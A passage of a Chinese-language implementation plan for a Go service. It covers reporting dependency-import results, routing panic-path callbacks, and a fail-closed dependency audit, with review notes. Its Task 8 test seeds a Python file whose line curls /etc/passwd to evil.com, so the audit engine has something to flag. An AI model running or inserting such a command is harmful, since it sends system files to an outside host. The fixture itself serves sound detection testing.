	addr, dID, reqID, tID, err := ValidateAndNormalizePlatformParams(platformAddr, dockerID, requestID, taskID)
	if err != nil {
		return err
	}

	var msgPtr *string
	if strings.TrimSpace(msg) != "" {
		msgVal := msg
		msgPtr = &msgVal
	}

	payload := reportAuditPayload{
		DockerID:  dID,
		RequestID: reqID,
		TaskID:    tID,
		Code:      code,
		Msg:       msgPtr,
		Report:    report,
		Scope:     scope,
	}
	data, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("marshal reportAudit payload: %w", err)
	}

	url := PlatformURL(addr, ReportAuditEndpoint)
	return SendPlatformJSON(ctx, defaultHTTPClient, url, data)
}
```

把既有 `ReportAudit`（`:191`）改为委托，保证行为不变：

```go
func ReportAudit(ctx context.Context, platformAddr, dockerID, requestID, taskID string, code int, msg, report string) error {
	return ReportAuditScoped(ctx, platformAddr, dockerID, requestID, taskID, code, msg, report, "")
}
```

- [ ] **Step 4: controller 层封装**

`internal/controller/report.go` 中，`ReportModelImport`（`:31`）之后新增：

```go
// ReportDeps 上报依赖包导入结果。
func ReportDeps(ctx context.Context, platformAddr, dockerID, requestID, taskID string, code int, msg string, checksum ...map[string]any) error {
	return platform.ReportDeps(ctx, platformAddr, dockerID, requestID, taskID, code, msg, checksum...)
}

// ReportAuditScoped 上报带 scope 的审计结果（"deps" 表示依赖包审计）。
func ReportAuditScoped(ctx context.Context, platformAddr, dockerID, requestID, taskID string, code int, msg, report, scope string) error {
	return platform.ReportAuditScoped(ctx, platformAddr, dockerID, requestID, taskID, code, msg, report, scope)
}
```

- [ ] **Step 5: 实现 `reportDepsAsync`**

**⚠️ 不要新增函数：`deps_import.go` 里已经有一个 `reportDepsAsync` 桩**（Task 6 落的，现位于
`:255`——Task 6 的 `ae24045` 扩充 `rollbackDepsImport` 注释后由 `:243` 下移，**按符号名定位**，
正文只有一条 `LogInfo`，注释写着 "Task 7 replaces it with the real platform callback"）。
本步骤是**替换它的函数体**（连同注释），不是再写一份——写第二份是 `redeclared in this block`
编译错误。`reportDepsSuccess`/`reportDepsFailure`（现 `:243`/`:248`）已经在调用它，替换后自动生效，
无需改动那两个。

形状参照 **`internal/controller/import_processing.go:698` 的 `reportModelImportAsync`**（注意：
它在 `import_processing.go`，**不在** `model_reporting.go`——后者放的是 `ReportModelLog`/
`ReportProgress` 与 `reportWatcher`）。日志标签沿用 `"importDeps"`。

```go
// reportDepsAsync 异步向平台上报依赖包导入结果。上报失败只记日志，不影响流水线结论。
func (s *TAAState) reportDepsAsync(requestID, taskID string, code int, msg string, checksum ...map[string]any) {
	s.mu.RLock()
	platformIP, dockerID := s.PlatformIP, s.DockerID
	s.mu.RUnlock()

	var cs map[string]any
	if len(checksum) > 0 {
		cs = checksum[0]
	}

	go func() {
		if err := ReportDeps(context.Background(), platformIP, dockerID, requestID, taskID, code, msg, cs); err != nil {
			s.Logs.Add(LogWarn, "importDeps", "上报依赖包导入结果失败: requestId=%s taskId=%s code=%d err=%v",
				requestID, taskID, code, err)
		}
	}()
}
```

`deps_import.go` 的 import 块补 `"context"`。

- [ ] **Step 6: 运行测试确认通过**

```bash
go test ./internal/platform/ ./internal/controller/ -run 'TestReportDeps|TestReportAuditScoped|TestProcessImportedDeps' -v
```

期望：全部 PASS。

- [ ] **Step 7: 提交**

```bash
git add internal/platform/reporter.go internal/platform/reporter_test.go internal/controller/report.go internal/controller/deps_import.go internal/controller/deps_import_test.go
git commit -m "feat(deps): report dependency import results and scoped audits"
```

- [ ] **Step 8: 修 panic 路径的终态回调**

依据见本任务前的「Task 6/7 编码前补充」：流水线 panic 时 `handleAsyncPanic` 会调
`ReportTaskOutcome(..., "deps_import", ...)`，而该方法只特判 `model_import`，其余一律落
`ReportRes` ⇒ 平台侧的 `importDeps` 任务永远收不到 `reportDeps`，表现为**挂起**而非失败。

测试（追加到 Step 1 新建的 `internal/platform/reporter_test.go`，同为内部测试包 `package platform`）：

```go
func TestReportTaskOutcomeDispatchesDepsToReportDeps(t *testing.T) {
	var path string
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		path = r.URL.Path
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"msg":"ok","result":{"received":true},"error":0}`))
	}))
	defer server.Close()

	if err := ReportTaskOutcome(context.Background(), server.URL, "docker-1", "req-1", "task-1", "deps_import", 1, "依赖包导入失败", ""); err != nil {
		t.Fatalf("ReportTaskOutcome: %v", err)
	}
	if path != ReportDepsEndpoint {
		t.Fatalf("path = %q, want %q -- a deps task must not be reported through the training-result callback", path, ReportDepsEndpoint)
	}
}
```

`ReportTaskOutcome`（`internal/platform/reporter.go:221-226`）在 `model_import` 分支之后增加：

```go
	if taskType == "deps_import" {
		return ReportDeps(ctx, platformAddr, dockerID, requestID, taskID, code, msg, checksum...)
	}
```

**不要改 `handleAsyncPanic`**——`route.go:844` 的注释写明"通过 ReportTaskOutcome 自动分流"，
这里就是既定扩展点。

`internal/controller/route.go:798-804` 的名字兜底另补一条 `deps` 判定。**注意该处实际是
`if taskType == ""` 里嵌一个 `if/else`，不是 `switch`**——下面的 `switch` 替换的是**内层**的
`if/else`，外层 `if taskType == ""` 的守卫必须原样保留。现在的形状是：

```go
	if taskType == "" {
		if strings.Contains(strings.ToLower(name), "model") {
			taskType = "model_import"
		} else {
			taskType = "data_import"
		}
	}
```

改成：

```go
	if taskType == "" {
		switch {
		case strings.Contains(strings.ToLower(name), "model"):
			taskType = "model_import"
		case strings.Contains(strings.ToLower(name), "deps"):
			taskType = "deps_import"
		default:
			taskType = "data_import"
		}
	}
```

当前该分支不可达：异步体执行时快照必已由 `tryAcquireTaskTyped` 建立（`snapshot.Type` 即
`"deps_import"`，见 `route.go:681-688`），因此 `taskType` 非空。但兜底分支存在的意义正是
快照意外缺失，所以仍要补——**并且不要**因此就以为补它是多余的而跳过。）

**变体验证（必做）**：删掉新增的 `deps_import` 分支后，`TestReportTaskOutcomeDispatchesDepsToReportDeps`
必须 **FAIL**（实测会打到 `reportRes` 的路径）。只断言"没有返回错误"的写法在该变异下仍然通过，
属于无效断言。还原后：

```bash
go test ./internal/platform/ -run 'TestReportTaskOutcome' -v
git add internal/platform/reporter.go internal/platform/reporter_test.go internal/controller/route.go
git commit -m "fix(deps): route the dependency panic path to reportDeps"
```

---

### Task 7 编码前预审发现（已直接改入正文，实现者无需再判断）

对 Task 7 的每个行号锚点与每个被调用的符号逐条实测后，修正 2 处会直接导致返工的缺陷，并记录
数条"经核实为正确"的事实：

| # | 级别 | 结论 | 依据 |
| :--- | :--- | :--- | :--- |
| F | 返工 | Step 5 原写"在 `deps_import.go` 中仿照…实现 `reportDepsAsync`"，但该函数**已经存在**——Task 6 在 `:243` 落了一个只记日志的桩，注释明写 "Task 7 replaces it with the real platform callback"。照原文再写一份即 `redeclared in this block` | `deps_import.go:243`（Task 6 进行中的工作区） |
| G | 返工 | Step 5 把模板指成 `model_reporting.go` 的 `reportModelImportAsync`，**该文件里没有这个函数**。真实位置是 `import_processing.go:698`；`model_reporting.go` 装的是 `ReportModelLog`/`ReportProgress`/`reportWatcher` | `grep -n "^func" internal/controller/model_reporting.go` 无匹配 |
| H | 返工 | `route.go:798-804` 的名字兜底是 `if taskType == ""` 里嵌的 `if/else`，**不是 `switch`**。原文只给了 `switch` 片段，未说明外层守卫要保留，照抄会把 `if taskType == ""` 一起删掉，使兜底变成无条件覆盖 `snapshot.Type` | `route.go:798-804` 实测 |

经核实为正确、记录在此以免被"顺手改坏"：

- `ReportDeps` 用到的四个 platform 层符号全部存在：`ValidateAndNormalizePlatformParams`（`reporter.go:95`）、
  `PlatformURL`（`client.go:38`）、`SendPlatformJSON`（`client.go:58`）、`defaultHTTPClient`（`client.go:19`）。
- 端点常量块是 `reporter.go:11-17`（`ReportModelImportEndpoint`/`ReportAuditEndpoint`/`ReportResEndpoint`/
  `ModelLogEndpoint`/`ReportProgressEndpoint`），`reportAuditPayload` 在 `:46-52`，
  `ReportModelImport` 在 `:152`、`ReportAudit` 在 `:191`、`ReportTaskOutcome` 在 `:221` —— 与 Files 块一致。
- `internal/platform/reporter_test.go` **确实不存在**（该目录只有 `client_test.go`），且后者是
  `package platform_test`。因此 Step 1 要求新建 `package platform` 的内部测试包是**必需**的，
  不是风格偏好：代码里用的是不加限定的 `ReportDepsEndpoint`/`ReportDeps`。同目录两个测试包并存合法，
  不要去改 `client_test.go`。
- Step 6 的 `-run 'TestProcessImportedDeps'` 会命中真实用例（`TestProcessImportedDepsInstallsAndRecords`
  等，由 Task 6 建立），不是空匹配。
- `internal/controller/report.go:31` 的 `ReportModelImport` 包装函数位置与 Step 4 一致。

> 记一条与 Task 6 的**职责边界**：`reportDepsAsync` 是**任务终态**通道；依赖审计报告走
> `reportAuditScopedAsync`（`scope=deps`）。两者都要发——只发后者，平台侧 `importDeps` 任务永远
> 等不到 `code`，表现为挂起。

---

### Task 7 编码前预审·第二轮（2026-10-08，逐符号核对）

**(R) Step 8 的实际收益比正文写的更大——它同时修好了崩溃恢复路径，正文只提了 panic 路径。**

正文的依据是 `handleAsyncPanic` → `ReportTaskOutcome`。实测该分发器**有两个调用方家族**：

| 调用方 | 位置 | 传的 taskType |
| :--- | :--- | :--- |
| panic 路径 | `route.go:846` | 同文件算出的 `taskType`（`route.go:795` 取自 `snapshot.Type`） |
| 崩溃恢复·快同步 | `recovery.go:225` | `activeTask.Type` |
| 崩溃恢复·后台补偿 | `recovery.go:364` | `taskType`（由 `activeTask.Type` 透传） |

三处最终都落到 `platform.ReportTaskOutcome`（`reporter.go:221`）**同一个** `if taskType == "model_import"` 特判。
`controller.ReportTaskOutcome`（`report.go:41`）只是转发、**没有任何分流逻辑**（已逐行读过 `:41-43`），
所以 Step 8 加在 platform 层是唯一且正确的位置，不需要在 controller 层重复一遍。

后果：没有这条 `deps_import` 分支时，**TAA 在依赖导入期间崩溃重启**，恢复流程也会把 `deps_import`
当成训练任务走 `ReportRes`，平台侧 `importDeps` 同样表现为挂起。Step 8 一并修掉，无需额外改动。

**(R2) 留一条低优先级、明确不扩本次范围的观察**：`recovery.go:222-224`（快同步）与 `:353-355`
（后台补偿）对用户可见的 `msg` 只特判了 `model_import`，`deps_import` 会落到训练口吻的
"TAA 异常崩溃重启，训练执行已被安全终止，请重新下发"。文案不准确但不影响分流正确性
（`code=1` 与目标端点都对），且属于恢复文案范畴——**不在 Task 7 范围内，此处仅记录**，
不修改 `recovery.go`。

**(S) 第二期（platform-mock）的具体待办，Task 7 不受影响，先行登记以免丢失。**

`reportRequest` 这个解码结构体在本仓库有**三份独立定义**，互不共享：

| # | 位置 | 用途 | Task 7 是否需要动 |
| :--- | :--- | :--- | :--- |
| 1 | `internal/controller/report.go:15` | 控制器侧;**仅被测试当解码目标**用 | 否 |
| 2 | `tools/platform-mock/internal/handlers_taa.go:17` | mock 平台解码上报体 | 否（见下） |
| 3 | 测试内的匿名结构体 | Task 8 用例自带 | 否 |

关键点：**Task 8 的用例不要用 `reportRequest` 解码**——它没有 `Scope` 字段，解出来恒为空，
`scope` 断言会永远失败（或更糟：写成 `== ""` 就永远通过）。Step 1 给的写法自带匿名
`struct{ Code int; Scope string }`，这是**必需的**，不是风格选择。

spec 第二期已确认推迟，但 mock 侧的具体缺口现在就能点清，免得第二期重新勘察：

- `tools/platform-mock/internal/server.go` 只注册了 `/v1/taa/reportResourceRes`、`reportRes`、
  `reportModelImport`、`reportAudit` 四条（`:122-125`），**没有 `/v1/taa/reportDeps`**；
- `tools/platform-mock/internal/proxy.go:53-60` 的按前缀分流表里同样**没有 `reportDeps`**，
  不补这一条，代理会把它归错类；
- mock 的 `reportRequest`（`handlers_taa.go:17`）**没有 `scope` 字段**，收下依赖审计上报后
  无法在 `/api/dashboard/status` 或 `/api/reportAudit/status` 里区分模型审计与依赖审计。

Task 7 本身用 `httptest` 自建服务端，**不依赖 mock**，因此上述三项不阻塞 Task 7，全部归第二期计划。

**(S2) 第三期（文档）的具体待办**，同属 §11，登记在此以免随本计划一起丢失：

| 依据 | 待办 |
| :--- | :--- |
| §11 第 3 期 | `docs/api-design.md` 新增 4.6（`importDeps`）与 4.7（`reportDeps`）两节 |
| §11 第 3 期 | `models/examples/install_deps.sh` 的角色降级并改写为"镜像基线依赖"说明 |
| §13 风险 4 | 文档中明确 **`PYTHONPATH` 前置的优先级语义**：依赖目录内的包优先于系统 site-packages，可能引入 numpy 一类的版本/ABI 冲突 |
| §13 风险 5 | 文档中写明时序约束：平台必须先 `importDeps` 后 `import`；依赖晚于数据下发时，本轮训练会以缺依赖失败 |
| §10 | 运维说明：`depsDir` 指向外部卷；清理是**人工动作**（自动清理会破坏复用与按 hash 回滚） |
| 本计划 (R2) | `recovery.go:222-224`/`:353-355` 对 `deps_import` 复用训练口吻的崩溃文案，措辞不准确 |

> **注意**：第三期要改的 `docs/api-design.md` 是**既有项目文档**，不受 CLAUDE.md"spec/plan 一律不得放进
> `docs/`"那条约束的管辖——那条约束管的是 spec 与 plan 的存放位置，不是禁止修改既有 API 文档。

---

### Task 7 闭环记录（2026-10-08，规范审查 + 质量审查两轮后 APPROVE）

**交付**：五个提交，`1e8450d..54e45e4`。

| 提交 | 内容 |
| :--- | :--- |
| `b3eee6e` | feat：`ReportDeps` 平台回调、`ReportAuditScoped` 的 `scope`、`ReportTaskOutcome` 分流、`route.go` 任务类型推断认 `deps` |
| `61db832` | fix：依赖 panic 路径改走 `reportDeps` |
| `b537974` | test：流水线用例的 httptest 按路径过滤（**预防性**，理由见下） |
| `b783484` | test：钉住"未带 scope 的审计载荷字节不变" + scoped 用例断言 endpoint |
| `54e45e4` | fix：依赖上报成功路径补日志、七条注释转英文、两条注释时态订正 |

**规范审查（APPROVED，零返工）**：Steps 1–8 全 PASS；`reportDepsPayload` 与 `reportModelImportPayload`
逐字段比对"无一处无谓分歧"；`route.go` 的 switch 对既有 model/data 行为逐字符等价；两次变异由审查者
**独立重跑并逐字复现**。它另确认实现者先前指出的**四处任务文本错误**判断全部正确（`reportDepsEndpoint`
并不预先存在、Step 5 行锚点漂移约 37 行、`"context"` 早已 import、Step 8 的分支落在了 feat 提交里）。
**这是本计划第二次"计划写错、实现者按真实代码纠正"**（前一次是 Task 6），说明编码前预审这一环是值的。

**质量审查（APPROVED，1 Important + 6 Minor）**：五项变异。`A`/`B`/`E` 证明三条承重路径真实存在
且被有效断言；`D` 证明 `route.go` 的 `deps` 分支**黑盒测不到**（该分支只在快照 `Type == ""` 时执行，
而异步体运行时快照必已由 `tryAcquireTaskTyped` 建立）——非疏漏，登记备查以免后人以为它被钉住了；
`C` 是唯一有实质发现的一项：**去掉 `,omitempty` 后两个包全绿**，即 I1。

**已修**：

- **I1**：「旧审计载荷字节不变」是本任务对**外部系统**做的兼容承诺，却无任何测试保护。补否定断言
  （`!bytes.Contains(rawBody, []byte(\`"scope"\`))`，沿用 `report_model_import_test.go:141` 钉 `checksum`
  的同一手法），并以同一个变异证明它现在**会**失败。
- **M5**：上报**成功**路径在 TAA 日志环里静默。该回调存在的全部意义就是"平台是否知道结果"，成功无痕
  等于"根本没发出去"与"已送达"在日志上无法区分。补 `LogInfo`，与两个 sibling（成功失败双记）对齐。
- **M3**：两条注释把 Task 8 尚不存在的代码写成现在时（断言"审计会上报"、引用 `runDepsAudit` 里并不存在
  的 LLM 分支）。这与 Task 6 抓出的那个缺陷**同类**（注释与相邻代码互相否证），故按缺陷处理。
- **M2**：七条中文注释转英文。
- **M6a**：`TestReportAuditScopedCarriesScope` 不校验 `r.URL.Path`，把 scoped 审计发到错误端点的变异
  仍会通过。补断言。

**记录不修**：**M4**（`reportDepsAsync` 的私有变参 `checksum ...map[string]any` 隐藏"只有第 0 个算数"
这条会静默丢弃的规则，但按今天的调用方不可达，且签名系计划正文明确给出、规范审查已核过与
`reportModelImportAsync` 同形——为一条无可达影响的风格偏好去偏离已验收的签名，churn 不划算）；
**M6b**（`ReportDeps` 的 `code==0 && msg==""` 默认文案零覆盖，实践中是死代码）。

**M2 的边界**：`internal/platform/reporter.go` 在本分支**之前**就有 5 条中文注释（来自 `master` 的
`6437adb`/`574dd77`），该文件以中文注释为主。我仍把 Task 7 新增的 4 条转为英文，依据是 CLAUDE.md 的
"English comments only" 无例外且我对每个 subagent 都如此要求；代价是该文件仍余既有中文注释，文件内
不再统一。若要更强的统一，应做一次**仓库级一次性清理**，而不是按任务零敲碎打——留待收尾时提请决策。

**`b537974` 是预防性修复，不是缺陷修复**。规范审查发现：`TestProcessImportedDepsReportsFailureCodeToPlatform`
的 httptest 用容量 1 通道 + 非阻塞发送（先到先得），而 Task 8 落地后 `auditAndReportDeps` 会从自己的
goroutine 先发出 `scope=deps` 的审计上报到**同一**地址；审计上报先到时用例会以 "path = reportAudit,
want reportDeps" 失败——**假失败，不会假通过**（只有终态回调才产生 `code=1`），但足以把 Task 8 的
实现者引向错误方向、或诱使其削弱断言。修法是把路径过滤放进服务端 handler。
**交底 Task 8**：若该用例以 path 不符失败，那是别处出了问题，**不得削弱它**。

**process record（自报失准，被独立复现抓住）**：修复方报告称它在一个 flake 的 "clean pre-Task-7 commit
`61db832`" 上复现——但 `61db832` 是 Task 7 **三个提交里的第二个**，根本不是基线。质量审查者独立复现
并纠正：真基线是 `1e8450d`（100 轮 7 失败），HEAD 上 60 轮 2 失败；机制在 `concurrency_test.go` 自身
（该用例 POST 后不调 `waitForIdle` 就返回，后台 goroutine 撞 `t.TempDir()` 的 `RemoveAll`），与本范围
diff 无交集。**结论正确、证据错误**——这类偏差只有独立复现能抓，已记入记忆。

**§9 交接 Task 8**：spec §9 末段要求"已知盲区需在实现与交付中明示"（wheel 内 `.so`/`.pyd` 二进制不在
静态扫描范围；完整性只有 SM3、无签名验签）。**此前无任何 Task 覆盖这一条**，归 Task 8 的 `deps_audit.go`。

---

### Task 8/10 编码前预审发现（已直接改入正文，实现者无需再判断）

对 Task 8 的实现块逐行核对既有代码后，发现并修正 1 处**编译级**缺陷，另有 3 处经核实为**正确**、
记录在此以免后来者"顺手改坏"：

| # | 级别 | 结论 | 依据 |
| :--- | :--- | :--- | :--- |
| E | 编译 | `deps_audit.go` 的 import 块只写了 `"context"` 与 `"os"`，函数体却调用 `codeaudit.GenerateAuditReport` ⇒ `undefined: codeaudit`，直接编译失败。**已补** `"taa/internal/codeaudit"` | `import_processing.go:16` 用的就是这个**无别名**路径；同包内 `newLLMClient`/`isLLMServiceAvailable` 亦同文件 |
| — | 核实正确 | 实现块**没有**调用 `setLastAudit`，这是对的：`setLastAudit` 承载 `/v1/taa/status` 里**模型**审计的结果，依赖审计若调用它会把模型审计结果覆盖掉。`clearAuditState`（`route.go:561-565`）同样不适用于本路径 | `auditAndReportModelImport`（`import_processing.go:606-658`）是唯一调用方 |
| — | 核实正确 | `cfg := s.Security.LLM`、`newLLMClient(cfg)`、`GenerateAuditReport(context.Background(), dir, s.Security.Engine, cfg, llmClient)`、`auditReportJSON(audit)` 四个符号的签名/字段全部与实现块用法吻合 | `verifier.go:320`、`import_processing.go:735`/`:760`、`codeaudit_projection.go:49` |
| — | 核实正确 | 失败路径用 `os.RemoveAll(depsDir)` 而非 `cleanDirContents`，是**有意**的：依赖目录是内容寻址的**叶子**，整体删除正是"不留半成品"的语义；`cleanDirContents` 用于模型目录那种"要保留目录本身"的场景 | 与 §6「`rm -rf depsDir/<sm3>`（不留半成品目录）」一致 |

> 补充（Task 9 编码前预审）：Task 9 Step 7 原写 `-run '...|TestExecuteTraining'`，但
> `TestExecuteTraining` **在本仓库不存在**（已 grep 确认），`-run` 匹配零个用例时仍退出 0，
> 会制造"回归通过"的假象。已改为 `-run` 两条新用例 + 整个 `internal/controller` 包全量测试。
> 另核实：`setupTestState`（`handler_test.go:26`）已设 `DepsDir: t.TempDir()`，且
> `currentDepsDir()`（`deps_state.go:54`）在 `DepsImported=false` 时返回 `""`，
> 故 Step 6 的回归用例成立。

---

### Task 8 编码前预审·第二轮（2026-10-08，逐符号核对）

**(P) `depsAuditFunc` 是为测试新造的生产可达接缝，已删除——模型审计的既有测试证明不必如此。**

| 事实 | 依据 |
| :--- | :--- |
| `setupTestState` 装的引擎是 `codeaudit.DefaultEngine()` | `handler_test.go:73-76` |
| 它是**正则基线**，不需要 semgrep 二进制 | `engine.go:154-156`：`regexEngine{scanner: DefaultScanner()}` |
| 模型审计**没有**任何测试钩子，直接调真实引擎 | `import_processing.go:638` |
| 其用例喂一个命中规则的 `train.py`，跑真引擎，用 httptest 平台断言 `code=1` | `audit_model_import_test.go:275`（`TestAuditAndReportModelImportStaticFail`） |
| controller 包内可直接引用 `reportAuditEndpoint` | `report.go:11` |

初稿的钩子不只是风格问题，它有实质代价：**它恰好跳过 §12 要覆盖的三段**——真
`codeaudit.GenerateAuditReport` 调用、`auditReportJSON(audit)` 投影、以及
`ReportAuditScoped(..., "deps")` 的 scope 传递。钩子分支里 `summary` 是测试给的字符串、`report`
直接传 `""`，于是"审计报告确实以 `scope=deps` 发出"这条**在 Task 8 完全没被验证**，而它正是 §8 里
平台侧区分两类报告的唯一依据。改成真引擎后，一个用例同时钉住清除行为与上报形状。已按此改写
Step 1 的用例与 Step 3 的实现块。

**(P2) 顺带核实（结论：保留，不是冗余）**：`runDepsAudit` 在锁内置
`ActiveAuditTaskID`/`ActiveAuditRequestID`/`CurrentAuditOp="auditing"`/`AuditRunning=true`，
与 `startModelAuditAsync`（`import_processing.go:589-594`）同形。`tryAcquireTaskTyped` 里有一条
**专为依赖导入而写**的门禁：`if taskType == "model_import" || taskType == "deps_import" { if s.isAuditBusyLocked() { …409… } }`
（`route.go:645-655`，注释明写"两者都驱动共享审计子系统"）。置位是那条约定的组成部分，删掉会让
注释变成假话。

**(P3) 订正本日志前文一处措辞**：`clearAuditState()` 只清
`ActiveAuditTaskID`/`ActiveAuditRequestID`/`CurrentAuditOp`/`AuditRunning`（`resetAuditStateLocked`，
`route.go:553-558`），**不碰 `LastAudit`**，所以调用它不会覆盖模型审计在 `/v1/taa/status` 里的结果。
上文"Task 8/10 编码前预审发现"表里那句"`clearAuditState` 同样不适用于本路径"**措辞过宽**，准确说法是
"**不需要 `setLastAudit`**"；`clearAuditState` 本身是正确的收尾——模型路径同样以它收尾
（`import_processing.go:597-598` 的 `runAsyncSafe` 清理回调）。

**(Q) 删除 Task 8 里两条 `TestRollbackDepsImport*` 单元用例，并订正它们的立论。**

初稿把它们放在 Task 8，理由是"Task 6 的 `runDepsAudit` 桩恒返回 true，所以失败分支在 Task 6 不可达"。
**该理由在 (L) 之后已不成立**，且这两个场景现在由 Task 6 的流水线用例端到端覆盖：

| 初稿的 Task 8 用例 | 现在的覆盖者（Task 6，`ae24045`） |
| :--- | :--- |
| `TestRollbackDepsImportKeepsAnUnrelatedBinding` | `TestProcessImportedDepsInstallFailureKeepsWorkingBinding` + `…KeepsBindingWhenNewAuditFails` |
| `TestRollbackDepsImportClearsTheBindingItOwns` | `TestProcessImportedDepsInstallFailureClearsBindingWhenItsDirectoryIsGone` |

两者都**经真实调用点**到达同一段代码，且已各有变异判死（删掉 `:165` 的 `rollbackDepsImport`
⇒ 两个用例同时 FAIL）。在同一份计划里留第二份同义断言，只多一个"改了这里忘了改那里"的位置，
故删除；Step 1 留一段注释说明该不变量归 Task 6 的流水线用例所有，Step 2/Step 5 的 `-run` 同步收窄。

---

## Task 8: 依赖审计（fail-closed，scope=deps）

**Files:**
- Create: `internal/controller/deps_audit.go`
- Modify: `internal/controller/deps_import.go`（删掉 Task 6 的最小 `runDepsAudit`）
- Test: `internal/controller/deps_import_test.go`（追加）

- [ ] **Step 1: 写失败测试**

追加到 `internal/controller/deps_import_test.go`：

```go
// TestRunDepsAuditRemovesDirOnFailure pins the fail-closed cleanup and the scope=deps report
// together. It drives the real engine (the regex baseline setupTestState installs) exactly as
// TestAuditAndReportModelImportStaticFail does for the model path, so the assertion covers the
// engine call, the JSON projection and the report as one unit. It asserts nothing about the
// binding: that is rollbackDepsImport's job and is covered by the pipeline tests.
func TestRunDepsAuditRemovesDirOnFailure(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = true
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}

	received := make(chan struct {
		Code  int    `json:"code"`
		Scope string `json:"scope"`
	}, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportAuditEndpoint {
			return
		}
		var rr struct {
			Code  int    `json:"code"`
			Scope string `json:"scope"`
		}
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"

	depsDir := filepath.Join(state.Security.GetDepsDir(), "evilhash")
	if err := os.MkdirAll(depsDir, 0o755); err != nil {
		t.Fatalf("seed dir: %v", err)
	}
	code := "import subprocess\nsubprocess.run([\"curl\", \"http://evil.com\", \"-d\", \"@/etc/passwd\"])\n"
	if err := os.WriteFile(filepath.Join(depsDir, "pkg.py"), []byte(code), 0o644); err != nil {
		t.Fatalf("seed file: %v", err)
	}

	if passed := state.runDepsAudit(depsImportRequest{RequestID: "req-1", TaskID: "task-1"}, depsDir); passed {
		t.Fatal("runDepsAudit returned true for a failing audit")
	}
	if _, err := os.Stat(depsDir); !os.IsNotExist(err) {
		t.Fatalf("deps dir still present after a failed audit: %v", err)
	}

	select {
	case rr := <-received:
		if rr.Code != 1 {
			t.Fatalf("code = %d, want 1 (static audit failure)", rr.Code)
		}
		if rr.Scope != "deps" {
			t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for the scope=deps audit report")
	}
}

// rollbackDepsImport's own two branches are NOT unit-tested here: Task 6's pipeline tests reach
// both through real call sites -- TestProcessImportedDepsInstallFailureKeepsWorkingBinding (a
// non-bound directory is removed, the working binding is kept) and
// TestProcessImportedDepsInstallFailureClearsBindingWhenItsDirectoryIsGone (the bound directory
// is removed, so the binding is cleared). Asserting the same invariant a second time at the unit
// level would only add another place to forget to update.
```

- [ ] **Step 2: 运行测试确认失败**

```bash
go test ./internal/controller/ -run 'TestRunDepsAuditRemovesDirOnFailure' -v
```

期望：**运行时失败，不是编译失败**——包能编译，因为 `state.runDepsAudit` 已由 Task 6 的 fail-closed 桩提供。
应当报 `deps dir still present after a failed audit`：桩既不跑真引擎、也不清除目录。这条失败信息本身就是
判别力的证据——它证明用例测的是"审计失败 ⇒ 目录被清"，而不是别的什么东西。

- [ ] **Step 3: 实现依赖审计**

创建 `internal/controller/deps_audit.go`：

```go
package controller

import (
	"context"
	"os"

	"taa/internal/codeaudit"
)

// runDepsAudit 对安装后的依赖目录执行与模型代码同引擎、同策略的审计，并以
// scope="deps" 上报。审计未通过时物理清除依赖目录——fail-closed 语义下，
// 被拒的依赖不应留在磁盘上。
// 审计状态位的置位/清位沿用 startModelAuditAsync（import_processing.go:589）的既有写法：
// startModelAuditAsync 在锁内写四个字段，审计体在首尾用 setCurrentAuditOp 切换 current_op。
//
// 本函数不设测试钩子：模型审计（auditAndReportModelImport）同样没有钩子，它的用例直接喂一个
// 命中规则的 train.py 跑真引擎并断言上报（audit_model_import_test.go:275）。依赖审计照同一手法
// 测，断言才能覆盖引擎调用、auditReportJSON 投影、scope=deps 上报三段；加钩子恰好跳过这三段，
// 只剩"清除目录"这一步被覆盖。
func (s *TAAState) runDepsAudit(req depsImportRequest, depsDir string) bool {
	s.mu.Lock()
	s.ActiveAuditTaskID = req.TaskID
	s.ActiveAuditRequestID = req.RequestID
	s.CurrentAuditOp = "auditing"
	s.AuditRunning = true
	s.mu.Unlock()
	defer s.clearAuditState()

	cfg := s.Security.LLM
	llmClient := newLLMClient(cfg)

	// fail-closed：LLM 启用且要求不可用时阻断时，先探测可用性，不可用即判定失败，
	// 避免降级为纯静态扫描静默放行。策略与模型代码审计完全一致。
	if cfg.Enabled && cfg.FailClosed && !isLLMServiceAvailable(llmClient, cfg.Endpoint, cfg.Model) {
		s.Logs.Add(LogError, "audit", "LLM 服务不可用，依赖审计按 fail-closed 上报失败: endpoint=%s model=%s", cfg.Endpoint, cfg.Model)
		_ = os.RemoveAll(depsDir)
		s.reportAuditScopedAsync(req.RequestID, req.TaskID, 2, "LLM 服务不可用，按 fail-closed 策略上报失败", "", "deps")
		return false
	}

	audit, err := codeaudit.GenerateAuditReport(context.Background(), depsDir, s.Security.Engine, cfg, llmClient)
	if err != nil {
		s.Logs.Add(LogError, "audit", "依赖包审计执行失败: %v", err)
		_ = os.RemoveAll(depsDir)
		s.reportAuditScopedAsync(req.RequestID, req.TaskID, 2, "依赖包审计失败: "+err.Error(), "", "deps")
		return false
	}

	code := 0
	if !audit.Conclusion.Passed {
		code = 1
		_ = os.RemoveAll(depsDir)
	}
	s.Logs.Add(LogInfo, "audit", "依赖包审计完成: passed=%v, riskLevel=%s, totalFindings=%d",
		audit.Conclusion.Passed, audit.Conclusion.RiskLevel, audit.Conclusion.Statistics.Total())

	s.reportAuditScopedAsync(req.RequestID, req.TaskID, code, audit.Conclusion.Summary, auditReportJSON(audit), "deps")
	return audit.Conclusion.Passed
}
```

无钩子不影响可测性：`setupTestState`（`handler_test.go:73-76`）装的引擎是
`codeaudit.DefaultEngine()`，即**正则基线**（`engine.go:154-156`），不需要 Semgrep 二进制；
LLM 侧用 `LLMConfig{Enabled: false}` 关掉，`cfg.Enabled && cfg.FailClosed` 的探测分支随之不进入。
（若日后把 `DefaultEngine` 换成 Semgrep，本用例会随之需要 semgrep 二进制——届时按 `codeScanEngine`
在测试里显式指定正则基线即可，不必为此恢复钩子。）

